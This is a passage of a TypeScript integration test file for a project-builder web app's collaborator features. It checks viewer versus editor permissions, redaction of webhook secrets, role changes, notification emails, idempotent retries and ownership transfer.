    const ruleRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Order/automations`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({
        trigger: "record_created",
        actionType: "webhook",
        toMode: "static",
        messageTemplate: "New order!",
        webhookUrl: "https://hooks.example.com/forge",
        webhookSecret: "s3cr3t-token",
      }),
    });
    assert.equal(ruleRes.status, 201);

    const inviteViewer = await fetch(`${baseUrl}/api/projects/${projectId}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: viewerEmail, role: "viewer" }),
    });
    assert.equal(inviteViewer.status, 201);
    const inviteEditor = await fetch(`${baseUrl}/api/projects/${projectId}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: editorEmail, role: "editor" }),
    });
    assert.equal(inviteEditor.status, 201);

    const ownerListRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations`, { headers: authHeaders(ownerToken) });
    const { rules: ownerRules } = (await ownerListRes.json()) as { rules: { webhookSecret: string | null }[] };
    assert.equal(ownerRules[0]!.webhookSecret, "s3cr3t-token", "the owner must still see the real secret");

    const editorListRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations`, { headers: authHeaders(editorToken) });
    const { rules: editorRules } = (await editorListRes.json()) as { rules: { webhookSecret: string | null }[] };
    assert.equal(editorRules[0]!.webhookSecret, "s3cr3t-token", "an editor must still see the real secret -- they could cause the identical webhook POST by editing a record");

    const viewerListRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations`, { headers: authHeaders(viewerToken) });
    assert.equal(viewerListRes.status, 200, "a viewer must still be able to read the rule list itself");
    const { rules: viewerRules } = (await viewerListRes.json()) as { rules: { webhookSecret: string | null; webhookUrl: string | null }[] };
    assert.equal(viewerRules[0]!.webhookSecret, null, "a viewer must never see the real webhook secret");
    assert.equal(viewerRules[0]!.webhookUrl, "https://hooks.example.com/forge", "only the secret is redacted -- every other field stays visible to a viewer as before");
  });
});

/**
 * Real role enforcement (RBAC): until this round, "collaborator" was a
 * single flat grant -- identical full access to the owner, no exceptions
 * (see the "identical full access" tests above this one). This adds a
 * genuine second tier, "viewer" (read-only), enforced server-side by
 * requireProjectWriteAccess -- not just a hidden button client-side. These
 * tests cover the new gate directly: inviting with an explicit role,
 * defaulting to "editor" when none is given, a viewer actually being
 * blocked from writes while still able to read, changing an existing
 * collaborator's role, and the role-change route's own owner-only guards.
 */
test("inviting a collaborator defaults to the 'editor' role when none is given, and an explicit 'viewer' role is stored and returned", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "rbac-owner1@example.com");
    await signup(baseUrl, "rbac-editor1@example.com");
    await signup(baseUrl, "rbac-viewer1@example.com");

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const defaultInvite = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "rbac-editor1@example.com" }),
    });
    assert.equal(defaultInvite.status, 201);
    const { collaborators: afterDefaultInvite } = (await defaultInvite.json()) as { collaborators: { email: string; role: string }[] };
    assert.equal(afterDefaultInvite.find((c) => c.email === "rbac-editor1@example.com")?.role, "editor");

    const viewerInvite = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "rbac-viewer1@example.com", role: "viewer" }),
    });
    assert.equal(viewerInvite.status, 201);
    const { collaborators: afterViewerInvite } = (await viewerInvite.json()) as { collaborators: { email: string; role: string }[] };
    assert.equal(afterViewerInvite.find((c) => c.email === "rbac-viewer1@example.com")?.role, "viewer");
  });
});

test("a 'viewer' collaborator can read a project's data but gets a real 403 (not a silent no-op) on every kind of write, while an 'editor' collaborator on the same project is unaffected", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "rbac-owner2@example.com");
    const viewerToken = await signup(baseUrl, "rbac-viewer2@example.com");
    const editorToken = await signup(baseUrl, "rbac-editor2@example.com");

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };

    const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(ownerToken) });
    await collectSSE(buildRes);

    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "rbac-viewer2@example.com", role: "viewer" }),
    });
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "rbac-editor2@example.com", role: "editor" }),
    });

    // Reads stay open to a viewer -- only writes are blocked.
    const viewerRead = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(viewerToken) });
    assert.equal(viewerRead.status, 200);

    const viewerRename = await fetch(`${baseUrl}/api/projects/${project.id}/name`, {
      method: "PATCH",
      headers: authHeaders(viewerToken),
      body: JSON.stringify({ name: "Renamed by a viewer" }),
    });
    assert.equal(viewerRename.status, 403);
    assert.equal(((await viewerRename.json()) as { code?: string }).code, "VIEWER_READ_ONLY");

    const entityName = project.spec.entities[0].name;
    const recordsRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${encodeURIComponent(entityName)}`, {
      headers: authHeaders(ownerToken),
    });
    const { records: seededRecords } = (await recordsRes.json()) as { records: { id: number }[] };
    const seededRecordId = seededRecords[0].id;

    // A no-op PATCH (no fields actually change) rather than a create, so
    // this doesn't need to know this dynamically-generated entity's own
    // required fields -- it still exercises the exact same
    // requireProjectWriteAccess gate every other write route does.
    const viewerUpdateRecord = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${encodeURIComponent(entityName)}/${seededRecordId}`, {
      method: "PATCH",
      headers: authHeaders(viewerToken),
      body: JSON.stringify({}),
    });
    assert.equal(viewerUpdateRecord.status, 403);
    assert.equal(((await viewerUpdateRecord.json()) as { code?: string }).code, "VIEWER_READ_ONLY");

    const viewerAutomation = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${encodeURIComponent(entityName)}/automations`, {
      method: "POST",
      headers: authHeaders(viewerToken),
      body: JSON.stringify({
        trigger: "record_created",
        actionType: "webhook",
        webhookUrl: "https://hooks.example.com/forge",
        messageTemplate: "hi",
      }),
    });
    assert.equal(viewerAutomation.status, 403);
    assert.equal(((await viewerAutomation.json()) as { code?: string }).code, "VIEWER_READ_ONLY");

    // The same two write attempts succeed for an "editor" collaborator on
    // the exact same project -- the gate is role-specific, not a blanket
    // regression for every non-owner.
    const editorRename = await fetch(`${baseUrl}/api/projects/${project.id}/name`, {
      method: "PATCH",
      headers: authHeaders(editorToken),
      body: JSON.stringify({ name: "Renamed by an editor" }),
    });
    assert.equal(editorRename.status, 200);

    const editorUpdateRecord = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${encodeURIComponent(entityName)}/${seededRecordId}`, {
      method: "PATCH",
      headers: authHeaders(editorToken),
      body: JSON.stringify({}),
    });
    assert.equal(editorUpdateRecord.status, 200);
  });
});

test("the owner can change an existing collaborator's role between 'editor' and 'viewer', and the change takes effect immediately on the next request", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "rbac-owner3@example.com");
    const collabToken = await signup(baseUrl, "rbac-collab3@example.com");

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "rbac-collab3@example.com" }),
    });
    const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, { headers: authHeaders(ownerToken) });
    const { collaborators } = (await listRes.json()) as { collaborators: { userId: string; role: string }[] };
    const collabUserId = collaborators[0].userId;
    assert.equal(collaborators[0].role, "editor");

    // Starts able to write (the default "editor").
    const beforeDemote = await fetch(`${baseUrl}/api/projects/${project.id}/name`, {
      method: "PATCH",
      headers: authHeaders(collabToken),
      body: JSON.stringify({ name: "Still an editor" }),
    });
    assert.equal(beforeDemote.status, 200);

    const demoteRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${collabUserId}/role`, {
      method: "PATCH",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ role: "viewer" }),
    });
    assert.equal(demoteRes.status, 200);
    const { collaborators: afterDemote } = (await demoteRes.json()) as { collaborators: { userId: string; role: string }[] };
    assert.equal(afterDemote.find((c) => c.userId === collabUserId)?.role, "viewer");

    const afterDemoteWrite = await fetch(`${baseUrl}/api/projects/${project.id}/name`, {
      method: "PATCH",
      headers: authHeaders(collabToken),
      body: JSON.stringify({ name: "Now a viewer" }),
    });
    assert.equal(afterDemoteWrite.status, 403, "the role change must take effect immediately, not just on the next invite");

    const promoteRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${collabUserId}/role`, {
      method: "PATCH",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ role: "editor" }),
    });
    assert.equal(promoteRes.status, 200);

    const afterPromoteWrite = await fetch(`${baseUrl}/api/projects/${project.id}/name`, {
      method: "PATCH",
      headers: authHeaders(collabToken),
      body: JSON.stringify({ name: "Promoted back" }),
    });
    assert.equal(afterPromoteWrite.status, 200);
  });
});

/**
 * Round 1254: this route used to send no notification anywhere once the
 * role change succeeded -- the same gap round 1253 just closed for the
 * sibling invite route, except here the affected collaborator (not the
 * owner who made the change) is the one who needs to know, since
 * rounds 886/891's own in-session UI self-correction never reaches an
 * offline collaborator or a closed tab. Confirms the real
 * EmailSender.send call reaches the AFFECTED collaborator, naming the
 * real project and the real new role.
 */
test("changing a collaborator's role sends a real notification to the AFFECTED collaborator, naming the project and new role, when email is configured", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const ownerToken = await signup(baseUrl, `owner-role-notify-${Date.now()}@example.com`);
      const collabEmail = `collab-role-notify-${Date.now()}@example.com`;
      await signup(baseUrl, collabEmail);

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string; name: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: collabEmail }),
      });
      const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, { headers: authHeaders(ownerToken) });
      const { collaborators } = (await listRes.json()) as { collaborators: { userId: string }[] };
      const collabUserId = collaborators[0].userId;
      emailSender.sentTo.length = 0; // The invite itself (round 1253) also sends one -- only the role-change send matters here.

      const roleRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${collabUserId}/role`, {
        method: "PATCH",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ role: "viewer", lang: "en" }),
      });
      assert.equal(roleRes.status, 200);

      assert.equal(emailSender.sentTo.length, 1, "exactly one notification must be sent");
      assert.equal(emailSender.sentTo[0].to, collabEmail, "the notification must go to the AFFECTED collaborator, not the owner who made the change");
      assert.match(emailSender.sentTo[0].text, new RegExp(project.name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")), "the body must name the real project");
      assert.match(emailSender.sentTo[0].text, /view-only/, "the body must name the real new role");
    },
    { emailSender },
  );
});

test("changing a collaborator's role itself still succeeds, with no notification attempted, when no email provider is configured", async () => {
  const emailSender = createFakeEmailSender({ configured: false });
  await withServer(
    async (baseUrl) => {
      const ownerToken = await signup(baseUrl, `owner-role-notify-unconfigured-${Date.now()}@example.com`);
      const collabEmail = `collab-role-notify-unconfigured-${Date.now()}@example.com`;
      await signup(baseUrl, collabEmail);

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: collabEmail }),
      });
      const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, { headers: authHeaders(ownerToken) });
      const { collaborators } = (await listRes.json()) as { collaborators: { userId: string }[] };

      const roleRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${collaborators[0].userId}/role`, {
        method: "PATCH",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ role: "viewer" }),
      });
      assert.equal(roleRes.status, 200, "the role change itself must still work exactly as before this feature existed");
      assert.equal(emailSender.sentTo.length, 0, "no send should even be attempted when email isn't configured");
    },
    { emailSender },
  );
});

/**
 * Round 1262: unlike the sibling invite route's own isNewGrant check
 * (round 1253), this route sent its round-1254 notification unconditionally
 * -- re-submitting the SAME role the collaborator already had (a UI
 * double-click, or any other no-op PATCH) sent an email falsely claiming
 * "your access was changed," with no real change behind it.
 */
test("re-submitting a collaborator's CURRENT role as a no-op sends no notification, while a genuine change still does", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const ownerToken = await signup(baseUrl, `owner-role-noop-${Date.now()}@example.com`);
      const collabEmail = `collab-role-noop-${Date.now()}@example.com`;
      await signup(baseUrl, collabEmail);

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: collabEmail }),
      });
      const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, { headers: authHeaders(ownerToken) });
      const { collaborators } = (await listRes.json()) as { collaborators: { userId: string; role: string }[] };
      const collabUserId = collaborators[0].userId;
      assert.equal(collaborators[0].role, "editor");
      emailSender.sentTo.length = 0; // The invite itself also sends one -- only the role-change sends matter here.

      const noOpRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${collabUserId}/role`, {
        method: "PATCH",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ role: "editor" }),
      });
      assert.equal(noOpRes.status, 200, "re-submitting the current role must still succeed");
      assert.equal(emailSender.sentTo.length, 0, "no notification must be sent for a role 'change' that isn't actually a change");

      const genuineRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${collabUserId}/role`, {
        method: "PATCH",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ role: "viewer" }),
      });
      assert.equal(genuineRes.status, 200);
      assert.equal(emailSender.sentTo.length, 1, "a genuine role change must still send exactly one notification");
    },
    { emailSender },
  );
});

/**
 * Round 1262: this route had no withIdempotency() wrap at all -- unlike its
 * three sibling mutation routes in the same family (invite, DELETE
 * collaborator, transfer-ownership). A retried PATCH with the same
 * X-Idempotency-Key used to re-run the mutation (harmlessly, since setting
 * the same role twice is itself idempotent at the DB layer) AND re-send the
 * notification email a second time for what the client sees as one request.
 */
test("PATCH .../collaborators/:userId/role retried with the same idempotency key sends the role-change notification only once", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const ownerToken = await signup(baseUrl, `owner-role-idem-${Date.now()}@example.com`);
      const collabEmail = `collab-role-idem-${Date.now()}@example.com`;
      await signup(baseUrl, collabEmail);

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: collabEmail }),
      });
      const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, { headers: authHeaders(ownerToken) });
      const { collaborators } = (await listRes.json()) as { collaborators: { userId: string }[] };
      const collabUserId = collaborators[0].userId;
      emailSender.sentTo.length = 0;

      const headers = { ...authHeaders(ownerToken), "x-idempotency-key": "role-change-repro-key" };
      const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${collabUserId}/role`, {
        method: "PATCH",
        headers,
        body: JSON.stringify({ role: "viewer" }),
      });
      assert.equal(firstRes.status, 200);

      const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${collabUserId}/role`, {
        method: "PATCH",
        headers,
        body: JSON.stringify({ role: "viewer" }),
      });
      assert.equal(retryRes.status, 200, "a retried role change with the same idempotency key must replay the original success");

      assert.equal(emailSender.sentTo.length, 1, "the retry must replay the cached response, not re-run the mutation and send a second notification");
    },
    { emailSender },
  );
});

test("changing a collaborator's role is owner-only, can't target the owner's own id, and 404s for a userId that isn't a real collaborator", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "rbac-owner4@example.com");
    const collabToken = await signup(baseUrl, "rbac-collab4@example.com");
    const otherCollabToken = await signup(baseUrl, "rbac-collab4b@example.com");

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; ownerId: string } };

    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "rbac-collab4@example.com" }),
    });
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "rbac-collab4b@example.com" }),
    });
    const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, { headers: authHeaders(ownerToken) });
    const { collaborators } = (await listRes.json()) as { collaborators: { userId: string; email: string }[] };
    const collabUserId = collaborators.find((c) => c.email === "rbac-collab4@example.com")!.userId;

    // A non-owner collaborator can't change anyone's role -- 404, the same
    // existence-hiding treatment every other owner-only action here uses.
    const asNonOwner = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${collabUserId}/role`, {
      method: "PATCH",
      headers: authHeaders(otherCollabToken),
      body: JSON.stringify({ role: "viewer" }),
    });
    assert.equal(asNonOwner.status, 404);

    // The owner has no collaborator role of their own to change.
    const targetingOwner = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${project.ownerId}/role`, {
      method: "PATCH",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ role: "viewer" }),
    });
    assert.equal(targetingOwner.status, 400);
    assert.equal(((await targetingOwner.json()) as { code?: string }).code, "CANNOT_CHANGE_OWNER_ROLE");

    // A userId that was never a collaborator on this project at all.
    const unknownUser = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/not-a-real-user-id/role`, {
      method: "PATCH",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ role: "viewer" }),
    });
    assert.equal(unknownUser.status, 404);
    assert.equal(((await unknownUser.json()) as { code?: string }).code, "COLLABORATOR_NOT_FOUND");

    // An invalid role value is rejected by the schema, not silently coerced.
    const badRole = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${collabUserId}/role`, {
      method: "PATCH",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ role: "admin" }),
    });
    assert.equal(badRole.status, 400);
    assert.equal(((await badRole.json()) as { code?: string }).code, "VALIDATION_ERROR");
  });
});

/**
 * Regression test for a real gap found by round 1170's Explore survey:
 * project.ownerId was otherwise write-once, set at insertProject and never
 * updated anywhere -- the only way an owner could stop being responsible
 * for a project was deleting it outright (destroying it for every
 * collaborator). Confirms the full handoff: the new owner gains every
 * owner-only power (inviting, removing, changing roles) immediately, the
 * previous owner is demoted to "editor" (not evicted -- they keep full
 * write access, confirmed via a real write), and GET .../collaborators
 * reflects the new owner/collaborator list correctly on both sides.
 */
test("POST .../transfer-ownership hands the project to an existing collaborator, who immediately gains every owner-only power, while the previous owner is demoted to a full-access editor collaborator instead of losing access", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "transfer-owner1@example.com");
    const newOwnerToken = await signup(baseUrl, "transfer-new-owner1@example.com");
    await signup(baseUrl, "transfer-third-party1@example.com");

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; ownerId: string } };

    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "transfer-new-owner1@example.com" }),
    });
    const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, { headers: authHeaders(ownerToken) });
    const { collaborators } = (await listRes.json()) as { collaborators: { userId: string; email: string }[] };
    const newOwnerUserId = collaborators.find((c) => c.email === "transfer-new-owner1@example.com")!.userId;

    const transferRes = await fetch(`${baseUrl}/api/projects/${project.id}/transfer-ownership`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ userId: newOwnerUserId }),
    });
    assert.equal(transferRes.status, 200);
    const { collaborators: afterTransfer, owner: ownerAfter, project: projectAfter } = (await transferRes.json()) as {
      collaborators: { userId: string; role: string }[];
      owner: { userId: string } | null;
      project: { ownerId: string };
    };
    assert.equal(projectAfter.ownerId, newOwnerUserId, "the response's own project must reflect the new owner immediately");
    assert.equal(ownerAfter?.userId, newOwnerUserId);
    // The previous owner must now appear as an "editor" collaborator --
    // not vanish, and not stay the owner.
    assert.equal(afterTransfer.find((c) => c.userId === project.ownerId)?.role, "editor");
    // The new owner must NOT also appear as a stale collaborator row
    // alongside their own new ownership (collaborators.ts's own module
    // comment: ownership is project.ownerId, never a row in that table).
    assert.equal(afterTransfer.find((c) => c.userId === newOwnerUserId), undefined);

    // The new owner can immediately do something only the owner can do --
    // invite a genuinely new third party -- proving the handoff took
    // effect on THIS request, not just eventually.
    const inviteByNewOwner = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(newOwnerToken),
      body: JSON.stringify({ email: "transfer-third-party1@example.com" }),
    });
    assert.equal(inviteByNewOwner.status, 201, "the new owner must be able to invite someone, proving the handoff took effect on this exact request");

    // The previous owner, now demoted, still has full write access -- a
    // handoff, not an eviction.
    const writeByPreviousOwner = await fetch(`${baseUrl}/api/projects/${project.id}/name`, {
      method: "PATCH",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ name: "Still editing after being demoted" }),
    });
    assert.equal(writeByPreviousOwner.status, 200);

    // The previous owner has no owner-only powers left -- removing a
    // collaborator now 404s for them the same way it would for any other
    // non-owner collaborator.
    const removeByPreviousOwner = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${newOwnerUserId}`, {
      method: "DELETE",
      headers: authHeaders(ownerToken),
    });
    assert.equal(removeByPreviousOwner.status, 403, "a non-owner collaborator removing someone ELSE must 403, the same as any other collaborator");
  });
});

test("transferring ownership sends a real notification to the NEW owner, naming the project, when email is configured", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const ownerToken = await signup(baseUrl, `owner-transfer-notify-${Date.now()}@example.com`);
      const newOwnerEmail = `new-owner-transfer-notify-${Date.now()}@example.com`;
      await signup(baseUrl, newOwnerEmail);

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string; name: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: newOwnerEmail }),
      });
      const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, { headers: authHeaders(ownerToken) });
      const { collaborators } = (await listRes.json()) as { collaborators: { userId: string }[] };
      const newOwnerUserId = collaborators[0].userId;
      emailSender.sentTo.length = 0; // The invite itself (round 1253) also sends one -- only the transfer send matters here.

      const transferRes = await fetch(`${baseUrl}/api/projects/${project.id}/transfer-ownership`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ userId: newOwnerUserId, lang: "en" }),
      });
      assert.equal(transferRes.status, 200);

      assert.equal(emailSender.sentTo.length, 1, "exactly one notification must be sent");
      assert.equal(emailSender.sentTo[0].to, newOwnerEmail, "the notification must go to the NEW owner, not the previous owner who initiated the transfer");
      assert.match(emailSender.sentTo[0].text, new RegExp(project.name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")), "the body must name the real project");
    },
    { emailSender },
  );
});

test("transferring ownership itself still succeeds, with no notification attempted, when no email provider is configured", async () => {
  const emailSender = createFakeEmailSender({ configured: false });
  await withServer(
    async (baseUrl) => {
      const ownerToken = await signup(baseUrl, `owner-transfer-notify-unconfigured-${Date.now()}@example.com`);
      const newOwnerEmail = `new-owner-transfer-notify-unconfigured-${Date.now()}@example.com`;
      await signup(baseUrl, newOwnerEmail);

      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ description: "A CRM with customers and deals." }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };

      await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ email: newOwnerEmail }),
      });
      const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, { headers: authHeaders(ownerToken) });
      const { collaborators } = (await listRes.json()) as { collaborators: { userId: string }[] };

      const transferRes = await fetch(`${baseUrl}/api/projects/${project.id}/transfer-ownership`, {
        method: "POST",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ userId: collaborators[0].userId }),
      });
      assert.equal(transferRes.status, 200, "the transfer itself must still work exactly as before this feature existed");
      assert.equal(emailSender.sentTo.length, 0, "no send should even be attempted when email isn't configured");
    },
    { emailSender },
  );
});

test("POST .../transfer-ownership is owner-only, 404s for a userId that isn't an existing collaborator (including the owner's own id), and rejects a missing userId", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "transfer-owner2@example.com");
    const collabToken = await signup(baseUrl, "transfer-collab2@example.com");
    const outsiderToken = await signup(baseUrl, "transfer-outsider2@example.com");

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; ownerId: string } };

    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "transfer-collab2@example.com" }),
    });
    const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, { headers: authHeaders(ownerToken) });
    const { collaborators } = (await listRes.json()) as { collaborators: { userId: string }[] };
    const collabUserId = collaborators[0].userId;

    // A non-owner (not even a collaborator on this project) can't transfer
    // ownership -- 404, the same existence-hiding treatment every other
    // owner-only action here uses.
    const asOutsider = await fetch(`${baseUrl}/api/projects/${project.id}/transfer-ownership`, {
      method: "POST",
      headers: authHeaders(outsiderToken),
      body: JSON.stringify({ userId: collabUserId }),
    });
    assert.equal(asOutsider.status, 404);

    // Targeting the owner's own id is already naturally rejected: the
    // owner is never a row in project_collaborators, so getCollaboratorRole
    // returns null for it -- the same COLLABORATOR_NOT_FOUND path a
    // genuinely unknown userId would hit, with no separate "transfer to
    // yourself" check needed.
    const targetingSelf = await fetch(`${baseUrl}/api/projects/${project.id}/transfer-ownership`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ userId: project.ownerId }),
    });
    assert.equal(targetingSelf.status, 404);
    assert.equal(((await targetingSelf.json()) as { code?: string }).code, "COLLABORATOR_NOT_FOUND");

    // A userId that was never a collaborator on this project at all.
    const unknownUser = await fetch(`${baseUrl}/api/projects/${project.id}/transfer-ownership`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ userId: "not-a-real-user-id" }),
    });
    assert.equal(unknownUser.status, 404);
    assert.equal(((await unknownUser.json()) as { code?: string }).code, "COLLABORATOR_NOT_FOUND");

    // A missing userId is rejected by the schema, not silently coerced.
    const missingUserId = await fetch(`${baseUrl}/api/projects/${project.id}/transfer-ownership`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({}),
    });
    assert.equal(missingUserId.status, 400);
    assert.equal(((await missingUserId.json()) as { code?: string }).code, "VALIDATION_ERROR");

    // Collaborator-token sanity check wasn't exercised above -- confirm a
    // real, existing collaborator (not the owner) can't transfer ownership
    // either, the same 404 as the outsider case.
    const asCollaborator = await fetch(`${baseUrl}/api/projects/${project.id}/transfer-ownership`, {
      method: "POST",
      headers: authHeaders(collabToken),
      body: JSON.stringify({ userId: collabUserId }),
    });
    assert.equal(asCollaborator.status, 404);
  });
});

/**
 * Regression test for a real gap found by round 1171's Explore survey:
 * PATCH .../collaborators/:userId/role, DELETE .../collaborators/:userId,
 * and POST .../transfer-ownership (added just last round, with no limiter
 * of its own either) all had no rate limiter at all, unlike their sibling
